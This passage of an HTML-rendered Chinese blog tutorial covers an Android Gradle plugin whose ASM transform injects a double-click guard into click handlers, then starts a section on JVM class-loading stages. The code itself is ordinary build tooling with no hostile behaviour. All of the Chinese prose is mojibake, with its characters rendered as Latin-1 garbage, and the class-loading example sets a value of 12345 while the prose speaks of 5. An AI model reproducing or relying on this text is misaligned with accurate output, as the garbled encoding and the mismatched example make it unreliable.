punctuation">.</span>extensions<span class="token punctuation">.</span><span class="token function">getByType</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        appExtension<span class="token punctuation">.</span><span class="token function">registerTransform</span><span class="token punctuation">(</span><span class="token function">DoubleClickTransform</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å…¶ä¸­applyæ˜¯åœ¨ä½ å¯¼å…¥è¿™ä¸ªæ’ä»¶æ—¶æ‰§è¡Œçš„é€»è¾‘ï¼Œæˆ‘ä»¬åœ¨applyæ–¹æ³•ä¸­æ³¨å†Œäº†æˆ‘ä»¬å†™çš„Transformï¼Œåœ¨ç¼–è¯‘æ—¶ä¾¿ä¼šæ‰§è¡ŒTransformçš„å¯¹åº”é€»è¾‘ã€‚</p><p>ç„¶åæˆ‘ä»¬åªéœ€è¦åœ¨éœ€è¦ä½¿ç”¨è¿™ä¸ªæ’ä»¶çš„æ¨¡å—å¯¼å…¥å¹¶applyå°±å¯ä»¥äº†</p><pre class="line-numbers language-groovy" data-language="groovy"><code class="language-groovy"><span class="token keyword">import</span> github<span class="token punctuation">.</span>leavesczy<span class="token punctuation">.</span>asm<span class="token punctuation">.</span>plugins<span class="token punctuation">.</span>doubleClick<span class="token punctuation">.</span>DoubleClickPluginapply plugin<span class="token punctuation">:</span> DoubleClickPlugin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h6 id="transformé€»è¾‘"><a href="#transformé€»è¾‘" class="headerlink" title="transformé€»è¾‘"></a>transformé€»è¾‘</h6><p>æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹<code>DoubleClickTransform</code>ä¸­çš„å†…å®¹</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">class</span> <span class="token function">DoubleClickTransform</span><span class="token punctuation">(</span><span class="token keyword">private</span> <span class="token keyword">val</span> config<span class="token operator">:</span> DoubleClickConfig<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">BaseTransform</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">companion</span> <span class="token keyword">object</span> <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">const</span> <span class="token keyword">val</span> ViewDescriptor <span class="token operator">=</span> <span class="token string">"Landroid/view/View;"</span>        <span class="token keyword">private</span> <span class="token keyword">const</span> <span class="token keyword">val</span> OnClickViewMethodDescriptor <span class="token operator">=</span> <span class="token string">"(Landroid/view/View;)V"</span>        <span class="token keyword">private</span> <span class="token keyword">const</span> <span class="token keyword">val</span> ButterKnifeOnClickAnnotationDesc <span class="token operator">=</span> <span class="token string">"Lbutterknife/OnClick;"</span>        <span class="token keyword">private</span> <span class="token keyword">val</span> MethodNode<span class="token punctuation">.</span>onlyOneViewParameter<span class="token operator">:</span> Boolean            <span class="token keyword">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> desc <span class="token operator">==</span> OnClickViewMethodDescriptor        <span class="token keyword">private</span> <span class="token keyword">fun</span> MethodNode<span class="token punctuation">.</span><span class="token function">hasCheckViewAnnotation</span><span class="token punctuation">(</span>config<span class="token operator">:</span> DoubleClickConfig<span class="token punctuation">)</span><span class="token operator">:</span> Boolean <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">hasAnnotation</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>formatCheckViewOnClickAnnotation<span class="token punctuation">)</span>        <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">fun</span> MethodNode<span class="token punctuation">.</span><span class="token function">hasUncheckViewOnClickAnnotation</span><span class="token punctuation">(</span>config<span class="token operator">:</span> DoubleClickConfig<span class="token punctuation">)</span><span class="token operator">:</span> Boolean <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">hasAnnotation</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>formatUncheckViewOnClickAnnotation<span class="token punctuation">)</span>        <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">fun</span> MethodNode<span class="token punctuation">.</span><span class="token function">hasButterKnifeOnClickAnnotation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> Boolean <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">hasAnnotation</span><span class="token punctuation">(</span>ButterKnifeOnClickAnnotationDesc<span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">modifyClass</span><span class="token punctuation">(</span>byteArray<span class="token operator">:</span> ByteArray<span class="token punctuation">)</span><span class="token operator">:</span> ByteArray <span class="token punctuation">{</span>        <span class="token keyword">val</span> classReader <span class="token operator">=</span> <span class="token function">ClassReader</span><span class="token punctuation">(</span>byteArray<span class="token punctuation">)</span>        <span class="token keyword">val</span> classNode <span class="token operator">=</span> <span class="token function">ClassNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        classReader<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span>classNode<span class="token punctuation">,</span> ClassReader<span class="token punctuation">.</span>EXPAND_FRAMES<span class="token punctuation">)</span>        <span class="token keyword">val</span> methods <span class="token operator">=</span> classNode<span class="token punctuation">.</span>methods        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>methods<span class="token punctuation">.</span><span class="token function">isNullOrEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">val</span> shouldHookMethodList <span class="token operator">=</span> mutableSetOf<span class="token operator">&lt;</span>String<span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>methodNode <span class="token keyword">in</span> methods<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment">//é™æ€ã€åŒ…å« UncheckViewOnClick æ³¨è§£çš„æ–¹æ³•ä¸ç”¨å¤„ç†</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>methodNode<span class="token punctuation">.</span>isStatic <span class="token operator">||</span>                    methodNode<span class="token punctuation">.</span><span class="token function">hasUncheckViewOnClickAnnotation</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span>                <span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">continue</span>                <span class="token punctuation">}</span>                <span class="token keyword">val</span> methodNameWithDesc <span class="token operator">=</span> methodNode<span class="token punctuation">.</span>nameWithDesc                <span class="token keyword">if</span> <span class="token punctuation">(</span>methodNode<span class="token punctuation">.</span>onlyOneViewParameter<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>methodNode<span class="token punctuation">.</span><span class="token function">hasCheckViewAnnotation</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token comment">//æ·»åŠ äº† CheckViewOnClick æ³¨è§£çš„æƒ…å†µ</span>                        shouldHookMethodList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>methodNameWithDesc<span class="token punctuation">)</span>                        <span class="token keyword">continue</span>                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>methodNode<span class="token punctuation">.</span><span class="token function">hasButterKnifeOnClickAnnotation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token comment">//ä½¿ç”¨äº† ButterKnifeï¼Œä¸”å½“å‰ method æ·»åŠ äº† OnClick æ³¨è§£</span>                        shouldHookMethodList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>methodNameWithDesc<span class="token punctuation">)</span>                        <span class="token keyword">continue</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>classNode<span class="token punctuation">.</span><span class="token function">isHookPoint</span><span class="token punctuation">(</span>config<span class="token punctuation">,</span> methodNode<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    shouldHookMethodList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>methodNameWithDesc<span class="token punctuation">)</span>                    <span class="token keyword">continue</span>                <span class="token punctuation">}</span>                <span class="token comment">//åˆ¤æ–­æ–¹æ³•å†…éƒ¨æ˜¯å¦æœ‰éœ€è¦å¤„ç†çš„ lambda è¡¨è¾¾å¼</span>                <span class="token keyword">val</span> invokeDynamicInsnNodes <span class="token operator">=</span> methodNode<span class="token punctuation">.</span><span class="token function">findHookPointLambda</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span>                invokeDynamicInsnNodes<span class="token punctuation">.</span><span class="token function">forEach</span> <span class="token punctuation">{</span>                    <span class="token keyword">val</span> handle <span class="token operator">=</span> it<span class="token punctuation">.</span>bsmArgs<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">as</span><span class="token operator">?</span> Handle                    <span class="token keyword">if</span> <span class="token punctuation">(</span>handle <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        shouldHookMethodList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>handle<span class="token punctuation">.</span>name <span class="token operator">+</span> handle<span class="token punctuation">.</span>desc<span class="token punctuation">)</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>shouldHookMethodList<span class="token punctuation">.</span><span class="token function">isNotEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span>methodNode <span class="token keyword">in</span> methods<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">val</span> methodNameWithDesc <span class="token operator">=</span> methodNode<span class="token punctuation">.</span>nameWithDesc                    <span class="token keyword">if</span> <span class="token punctuation">(</span>shouldHookMethodList<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>methodNameWithDesc<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">val</span> argumentTypes <span class="token operator">=</span> Type<span class="token punctuation">.</span><span class="token function">getArgumentTypes</span><span class="token punctuation">(</span>methodNode<span class="token punctuation">.</span>desc<span class="token punctuation">)</span>                        <span class="token keyword">val</span> viewArgumentIndex <span class="token operator">=</span> argumentTypes<span class="token operator">?</span><span class="token punctuation">.</span><span class="token function">indexOfFirst</span> <span class="token punctuation">{</span>                            it<span class="token punctuation">.</span>descriptor <span class="token operator">==</span> ViewDescriptor                        <span class="token punctuation">}</span> <span class="token operator">?:</span> <span class="token operator">-</span><span class="token number">1</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>viewArgumentIndex <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                            <span class="token keyword">val</span> instructions <span class="token operator">=</span> methodNode<span class="token punctuation">.</span>instructions                            <span class="token keyword">if</span> <span class="token punctuation">(</span>instructions <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> instructions<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                <span class="token keyword">val</span> list <span class="token operator">=</span> <span class="token function">InsnList</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                                list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>                                    <span class="token function">VarInsnNode</span><span class="token punctuation">(</span>                                        Opcodes<span class="token punctuation">.</span>ALOAD<span class="token punctuation">,</span> <span class="token function">getVisitPosition</span><span class="token punctuation">(</span>                                            argumentTypes<span class="token punctuation">,</span>                                            viewArgumentIndex<span class="token punctuation">,</span>                                            methodNode<span class="token punctuation">.</span>isStatic                                        <span class="token punctuation">)</span>                                    <span class="token punctuation">)</span>                                <span class="token punctuation">)</span>                                list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>                                    <span class="token function">MethodInsnNode</span><span class="token punctuation">(</span>                                        Opcodes<span class="token punctuation">.</span>INVOKESTATIC<span class="token punctuation">,</span>                                        config<span class="token punctuation">.</span>formatDoubleCheckClass<span class="token punctuation">,</span>                                        config<span class="token punctuation">.</span>doubleCheckMethodName<span class="token punctuation">,</span>                                        config<span class="token punctuation">.</span>doubleCheckMethodDescriptor                                    <span class="token punctuation">)</span>                                <span class="token punctuation">)</span>                                <span class="token keyword">val</span> labelNode <span class="token operator">=</span> <span class="token function">LabelNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                                list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token function">JumpInsnNode</span><span class="token punctuation">(</span>Opcodes<span class="token punctuation">.</span>IFNE<span class="token punctuation">,</span> labelNode<span class="token punctuation">)</span><span class="token punctuation">)</span>                                list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token function">InsnNode</span><span class="token punctuation">(</span>Opcodes<span class="token punctuation">.</span>RETURN<span class="token punctuation">)</span><span class="token punctuation">)</span>                                list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>labelNode<span class="token punctuation">)</span>                                instructions<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span>                            <span class="token punctuation">}</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                <span class="token keyword">val</span> classWriter <span class="token operator">=</span> <span class="token function">ClassWriter</span><span class="token punctuation">(</span>ClassWriter<span class="token punctuation">.</span>COMPUTE_MAXS<span class="token punctuation">)</span>                classNode<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span>classWriter<span class="token punctuation">)</span>                <span class="token keyword">return</span> classWriter<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> byteArray    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">fun</span> ClassNode<span class="token punctuation">.</span><span class="token function">isHookPoint</span><span class="token punctuation">(</span>config<span class="token operator">:</span> DoubleClickConfig<span class="token punctuation">,</span> methodNode<span class="token operator">:</span> MethodNode<span class="token punctuation">)</span><span class="token operator">:</span> Boolean <span class="token punctuation">{</span>        <span class="token keyword">val</span> myInterfaces <span class="token operator">=</span> interfaces        <span class="token keyword">if</span> <span class="token punctuation">(</span>myInterfaces<span class="token punctuation">.</span><span class="token function">isNullOrEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span>        <span class="token punctuation">}</span>        <span class="token keyword">val</span> extraHookMethodList <span class="token operator">=</span> config<span class="token punctuation">.</span>hookPointList        extraHookMethodList<span class="token punctuation">.</span><span class="token function">forEach</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>myInterfaces<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>it<span class="token punctuation">.</span>interfaceName<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> methodNode<span class="token punctuation">.</span>nameWithDesc <span class="token operator">==</span> it<span class="token punctuation">.</span>methodSign<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token boolean">false</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">fun</span> MethodNode<span class="token punctuation">.</span><span class="token function">findHookPointLambda</span><span class="token punctuation">(</span>config<span class="token operator">:</span> DoubleClickConfig<span class="token punctuation">)</span><span class="token operator">:</span> List<span class="token operator">&lt;</span>InvokeDynamicInsnNode<span class="token operator">&gt;</span> <span class="token punctuation">{</span>        <span class="token keyword">val</span> onClickListenerLambda <span class="token operator">=</span> findLambda <span class="token punctuation">{</span>            <span class="token keyword">val</span> nodeName <span class="token operator">=</span> it<span class="token punctuation">.</span>name            <span class="token keyword">val</span> nodeDesc <span class="token operator">=</span> it<span class="token punctuation">.</span>desc            <span class="token keyword">val</span> find <span class="token operator">=</span> config<span class="token punctuation">.</span>hookPointList<span class="token punctuation">.</span><span class="token function">find</span> <span class="token punctuation">{</span> point <span class="token operator">-&gt;</span>                nodeName <span class="token operator">==</span> point<span class="token punctuation">.</span>methodName <span class="token operator">&amp;&amp;</span> nodeDesc<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span>point<span class="token punctuation">.</span>interfaceSignSuffix<span class="token punctuation">)</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span><span class="token label symbol">@findLambda</span> find <span class="token operator">!=</span> <span class="token keyword">null</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> onClickListenerLambda    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">getInputTypes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> Set<span class="token operator">&lt;</span>QualifiedContent<span class="token punctuation">.</span>ContentType<span class="token operator">&gt;</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> TransformManager<span class="token punctuation">.</span>CONTENT_CLASS    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">getScopes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> MutableSet<span class="token operator">&lt;</span><span class="token keyword">in</span> QualifiedContent<span class="token punctuation">.</span>Scope<span class="token operator">&gt;</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">mutableSetOf</span><span class="token punctuation">(</span>            QualifiedContent<span class="token punctuation">.</span>Scope<span class="token punctuation">.</span>PROJECT<span class="token punctuation">,</span>            QualifiedContent<span class="token punctuation">.</span>Scope<span class="token punctuation">.</span>SUB_PROJECTS<span class="token punctuation">,</span><span class="token comment">//            QualifiedContent.Scope.EXTERNAL_LIBRARIES</span>        <span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä»–è‡ªå·±å°è£…äº†ä¸€ä¸ª<code>BaseTransform</code>ï¼ŒæŠŠä¿®æ”¹classçš„è¿‡ç¨‹å°è£…æˆäº†ä¸€ä¸ª<code>modifierClass(byteArray: ByteArray): ByteArray</code>æ–¹æ³•ï¼Œè®©æˆ‘ä»¬èƒ½æ›´ä¸“æ³¨äºä¿®æ”¹ç±»ä¿¡æ¯çš„è¿‡ç¨‹ã€‚è‡³äºä»–æ˜¯æ€ä¹ˆå°è£…çš„ä¹Ÿå¯ä»¥è¯¾ä¸‹äº†è§£ï¼Œè¿™é‡Œæˆ‘ä»¬ç€é‡è®²ä»–å¦‚ä½•ä½¿ç”¨asmã€‚</p><p>æˆ‘ä»¬é¦–å…ˆåˆ†æä»–çš„é€»è¾‘ï¼Œæ— å¤–ä¹ä¸¤ç‚¹ï¼š</p><ul><li>æ‰¾åˆ°hookç‚¹ï¼ˆButterKnifeçš„onClickæ³¨è§£ï¼ŒView#setOnClickListenerï¼‰</li><li>åœ¨hookç‚¹æ’å…¥é€»è¾‘ä»£ç </li></ul><blockquote><p>è¿™é‡Œè‡ªç”±å‘æŒ¥å§ï¼Œéšä¾¿è®²ç‚¹å°±å·®ä¸å¤šäº†ã€‚</p></blockquote><h2 id="è™šæ‹Ÿæœºç±»åŠ è½½æœºåˆ¶"><a href="#è™šæ‹Ÿæœºç±»åŠ è½½æœºåˆ¶" class="headerlink" title="è™šæ‹Ÿæœºç±»åŠ è½½æœºåˆ¶"></a>è™šæ‹Ÿæœºç±»åŠ è½½æœºåˆ¶</h2><p><img src="https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/13202633-3cb11d1712a9efc9.webp" alt="13202633-3cb11d1712a9efc9"></p><h3 id="ç±»çš„ç”Ÿå‘½å‘¨æœŸ"><a href="#ç±»çš„ç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="ç±»çš„ç”Ÿå‘½å‘¨æœŸ"></a>ç±»çš„ç”Ÿå‘½å‘¨æœŸ</h3><h4 id="åŠ è½½-Loading"><a href="#åŠ è½½-Loading" class="headerlink" title="åŠ è½½ Loading"></a>åŠ è½½ Loading</h4><blockquote><p>è™šæ‹Ÿæœºä»ioæµè¯»å–ç±»æ–‡ä»¶åˆ°å†…å­˜ä¸­ã€‚</p><p>åŠ è½½è¿‡ç¨‹ä¸»è¦å®Œæˆä¸‰ä»¶äº‹æƒ…ï¼š</p><ol><li>é€šè¿‡ç±»çš„å…¨é™å®šåæ¥è·å–å®šä¹‰æ­¤ç±»çš„äºŒè¿›åˆ¶å­—èŠ‚æµ</li><li>å°†è¿™ä¸ªç±»å­—èŠ‚æµä»£è¡¨çš„é™æ€å­˜å‚¨ç»“æ„è½¬ä¸ºæ–¹æ³•åŒºçš„è¿è¡Œæ—¶æ•°æ®ç»“æ„</li><li>åœ¨å †ä¸­ç”Ÿæˆä¸€ä¸ªä»£è¡¨æ­¤ç±»çš„java.lang.Classå¯¹è±¡ï¼Œä½œä¸ºè®¿é—®æ–¹æ³•åŒºè¿™äº›æ•°æ®ç»“æ„çš„å…¥å£ã€‚</li></ol><p>è¿™ä¸ªè¿‡ç¨‹ä¸»è¦å°±æ˜¯ç±»åŠ è½½å™¨å®Œæˆã€‚</p></blockquote><h4 id="éªŒè¯-Verification"><a href="#éªŒè¯-Verification" class="headerlink" title="éªŒè¯ Verification"></a>éªŒè¯ Verification</h4><blockquote><p>æ­¤é˜¶æ®µä¸»è¦ç¡®ä¿Classæ–‡ä»¶çš„å­—èŠ‚æµä¸­åŒ…å«çš„ä¿¡æ¯ç¬¦åˆå½“å‰è™šæ‹Ÿæœºçš„è¦æ±‚ï¼Œå¹¶ä¸”ä¸ä¼šå±å®³è™šæ‹Ÿæœºçš„è‡ªèº«å®‰å…¨ã€‚</p><ol><li>æ–‡ä»¶æ ¼å¼éªŒè¯ï¼šåŸºäºå­—èŠ‚æµéªŒè¯ã€‚</li><li>å…ƒæ•°æ®éªŒè¯ï¼šåŸºäº<em><strong>æ–¹æ³•åŒº</strong></em>çš„å­˜å‚¨ç»“æ„éªŒè¯ã€‚</li><li>å­—èŠ‚ç éªŒè¯ï¼šåŸºäºæ–¹æ³•åŒºçš„å­˜å‚¨ç»“æ„éªŒè¯ã€‚</li><li>ç¬¦å·å¼•ç”¨éªŒè¯ï¼šåŸºäºæ–¹æ³•åŒºçš„å­˜å‚¨ç»“æ„éªŒè¯ã€‚</li></ol></blockquote><h4 id="å‡†å¤‡-Preparation"><a href="#å‡†å¤‡-Preparation" class="headerlink" title="å‡†å¤‡ Preparation"></a>å‡†å¤‡ Preparation</h4><blockquote><p>ä¸ºç±»å˜é‡åˆ†é…å†…å­˜ï¼Œå¹¶å°†å…¶åˆå§‹åŒ–ä¸ºé»˜è®¤å€¼ã€‚ï¼ˆæ­¤æ—¶ä¸ºé»˜è®¤å€¼ï¼Œåœ¨åˆå§‹åŒ–çš„æ—¶å€™æ‰ä¼šç»™å˜é‡èµ‹å€¼ï¼‰å³åœ¨æ–¹æ³•åŒºä¸­åˆ†é…è¿™äº›å˜é‡æ‰€ä½¿ç”¨çš„å†…å­˜ç©ºé—´</p></blockquote><p>ä¾‹å¦‚</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> value <span class="token operator">=</span> <span class="token number">12345</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è™½è¯´valueåœ¨ä»£ç ä¸­è¢«åˆå§‹åŒ–ä¸º5ï¼Œä½†è¿™æ—¶valueçš„å€¼ä»ç„¶ä¸º0ï¼Œå˜é‡è¦åœ¨åˆå§‹åŒ–é˜¶æ®µæ‰ä¼šè¢«èµ‹åˆå€¼ï¼ˆå¦‚æœæœ‰ï¼‰ã€‚</p><h4 id="è§£æ-Resolution"><a href="#è§£æ-Resolution" class="headerlink" title="è§£æ Resolution"></a>è§£æ Resolution</h4><blockquote><p>æŠŠç±»å‹ä¸­çš„ç¬¦å·å¼•ç”¨è½¬æ¢ä¸ºç›´æ¥å¼•ç”¨ã€‚</p><ul><li>ç¬¦å·å¼•ç”¨ä¸è™šæ‹Ÿæœºå®ç°çš„å¸ƒå±€æ— å…³ï¼Œå¼•ç”¨çš„ç›®æ ‡å¹¶ä¸ä¸€å®šè¦å·²ç»åŠ è½½åˆ°å†…å­˜ä¸­ã€‚å„ç§è™šæ‹Ÿæœºå®ç°çš„å†…å­˜å¸ƒå±€å¯ä»¥å„ä¸ç›¸åŒï¼Œä½†æ˜¯å®ƒä»¬èƒ½æ¥å—çš„ç¬¦å·å¼•ç”¨å¿…é¡»æ˜¯ä¸€è‡´çš„ï¼Œå› ä¸ºç¬¦å·å¼•ç”¨çš„å­—é¢é‡å½¢å¼æ˜ç¡®å®šä¹‰åœ¨Javaè™šæ‹Ÿæœºè§„èŒƒçš„Classæ–‡ä»¶æ ¼å¼ä¸­ã€‚</li><li>ç›´æ¥å¼•ç”¨å¯ä»¥æ˜¯æŒ‡å‘ç›®æ ‡çš„æŒ‡é’ˆï¼Œç›¸å¯¹åç§»é‡æˆ–æ˜¯ä¸€ä¸ªèƒ½é—´æ¥å®šä½åˆ°ç›®æ ‡çš„å¥æŸ„ã€‚å¦‚æœæœ‰äº†ç›´æ¥å¼•ç”¨ï¼Œé‚£å¼•ç”¨çš„ç›®æ ‡å¿…å®šå·²ç»åœ¨å†…å­˜ä¸­å­˜åœ¨</li></ul><p>ä¸»è¦æœ‰ä»¥ä¸‹å››ç§ï¼š</p><ul><li><p>ç±»æˆ–æ¥å£çš„è§£æ</p></li><li><p>å­—æ®µè§£æ</p></li><li><p>ç±»æ–¹æ³•è§£æ</p></li><li><p>æ¥å£æ–¹æ³•è§£æ</p></li></ul></blockquote><h4 id="åˆå§‹åŒ–-Initialization"><a href="#åˆå§‹åŒ–-Initialization" class="headerlink" title="åˆå§‹åŒ– Initialization"></a>åˆå§‹åŒ– Initialization</h4><blockquote><p>åˆå§‹åŒ–é˜¶æ®µæ˜¯æ‰§è¡Œç±»æ„é€ å™¨<client>æ–¹æ³•çš„è¿‡ç¨‹ã€‚<client>æ–¹æ³•æ˜¯ç”±ç¼–è¯‘å™¨è‡ªåŠ¨æ”¶é›†ç±»ä¸­çš„ç±»å˜é‡çš„èµ‹å€¼æ“ä½œå’Œé™æ€è¯­å¥å—ä¸­çš„è¯­å¥åˆå¹¶è€Œæˆçš„ã€‚è™šæ‹Ÿæœºä¼šä¿è¯<client>æ–¹æ³•æ‰§è¡Œä¹‹å‰ï¼Œçˆ¶ç±»çš„<client>æ–¹æ³•å·²ç»æ‰§è¡Œå®Œæ¯•ã€‚å¦‚æœä¸€ä¸ªç±»ä¸­æ²¡æœ‰å¯¹é™æ€å˜é‡èµ‹å€¼ä¹Ÿæ²¡æœ‰é™æ€è¯­å¥å—ï¼Œé‚£ä¹ˆç¼–è¯‘å™¨å¯ä»¥ä¸ä¸ºè¿™ä¸ªç±»ç”Ÿæˆ<client>()æ–¹æ³•ã€‚</client></client></client></client></client></p><p>javaä¸­ï¼Œå¯¹äºåˆå§‹åŒ–é˜¶æ®µï¼Œæœ‰ä¸”åªæœ‰ä»¥ä¸‹äº”ç§æƒ…å†µæ‰ä¼šå¯¹è¦æ±‚ç±»ç«‹åˆ»â€œåˆå§‹åŒ–â€ï¼ˆåŠ 